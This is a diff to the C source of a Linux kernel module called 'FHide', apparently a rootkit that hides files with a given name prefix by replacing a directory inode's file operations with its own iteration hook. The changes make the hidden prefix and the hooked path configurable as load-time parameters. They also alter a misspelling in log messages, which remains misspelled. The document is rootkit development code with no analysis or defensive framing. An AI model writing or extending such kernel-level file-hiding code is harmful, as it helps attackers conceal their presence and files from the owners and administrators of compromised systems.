@@ -19,6 +19,11 @@ module_init(fhide_init);
 module_exit(fhide_exit);
 
 static char *prefix = "rk_";
+module_param(prefix, charp, S_IRUGO);
+
+static char *kpath = "/";
+module_param(kpath, charp, S_IRUGO);
+
 struct file_operations proc_fops;
 const struct file_operations *backup_proc_fops;
 struct inode *proc_inode;
@@ -51,10 +56,10 @@ int rk_iterate_shared(struct file *file, struct dir_context *ctx)
 
 static int __init fhide_init(void)
 {
-    printk(KERN_INFO "FHide: LKM succefully loaded!\n");
+    printk(KERN_INFO "FHide: LKM succesfully loaded!\n");
     struct path p;
 
-    if(kern_path("/", 0, &p))
+    if(kern_path(kpath, 0, &p))
         return 0;
 
     proc_inode = p.dentry->d_inode;
@@ -71,12 +76,12 @@ static void __exit fhide_exit(void)
 {
     struct path p;
     struct inode *proc_inode;
-    if(kern_path("/", 0, &p))
+    if(kern_path(kpath, 0, &p))
         return;
     proc_inode = p.dentry->d_inode;
     proc_inode->i_fop = backup_proc_fops;
 
-    printk(KERN_INFO "FHide: LKM succefully unloaded!\n");
+    printk(KERN_INFO "FHide: LKM succesfully unloaded!\n");
 }
 
 MODULE_LICENSE("GPL");
